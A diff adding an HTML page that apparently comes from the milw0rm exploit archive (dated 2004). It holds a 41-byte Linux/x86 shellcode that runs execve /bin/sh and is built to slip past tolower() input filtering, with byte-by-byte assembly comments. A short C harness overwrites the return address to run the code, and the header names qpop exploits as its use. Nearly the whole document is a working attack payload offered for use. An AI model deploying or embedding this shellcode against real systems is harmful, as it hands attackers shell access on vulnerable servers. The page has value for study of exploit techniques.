@@ -1,0 +1,40 @@
+<html><head><title>linux/x86 execve /bin/sh tolower() evasion 41 bytes</title></head><pre>/*
+ *  Linux/x86
+ *  tolower() evasion, execve() /bin/sh 
+ *  (eg use: various qpop exploits)
+ */
+
+#include &lt;stdio.h&gt;
+
+char c0de[] =
+/* main: */
+&quot;\xeb\x1b&quot;                                   /* jmp callz                  */
+/* start: */
+&quot;\x5e&quot;                                       /* popl %esi                  */
+&quot;\x89\xf3&quot;                                   /* movl %esi, %ebx            */
+&quot;\x89\xf7&quot;                                   /* movl %esi, %edi            */
+&quot;\x83\xc7\x07&quot;                               /* addl $0x07, %edi           */
+&quot;\x29\xc0&quot;                                   /* subl %eax, %eax            */
+&quot;\xaa&quot;                                       /* stosb %al, %es:(%edi)      */
+&quot;\x89\xf9&quot;                                   /* movl %edi, %ecx            */
+&quot;\x89\xf0&quot;                                   /* movl %esi, %eax            */
+&quot;\xab&quot;                                       /* stosl %eax, %es:(%edi)     */
+&quot;\x89\xfa&quot;                                   /* movl %edi, %edx            */
+&quot;\x29\xc0&quot;                                   /* subl %eax, %eax            */
+&quot;\xab&quot;                                       /* stosl %eax, %es:(%edi)     */
+&quot;\xb0\x08&quot;                                   /* movb $0x08, %al            */
+&quot;\x04\x03&quot;                                   /* addb $0x03, %al            */
+&quot;\xcd\x80&quot;                                   /* int $0x80                  */
+/* callz: */
+&quot;\xe8\xe0\xff\xff\xff&quot;                       /* call start                 */
+/* DATA */
+&quot;/bin/sh&quot;;
+
+main() {
+        int *ret;
+        ret=(int *)&amp;ret +2;
+        printf(&quot;Shellcode lenght=%d\n&quot;,strlen(c0de));
+        (*ret) = (int)c0de;
+}
+
+// milw0rm.com [2004-09-12]</pre></html>
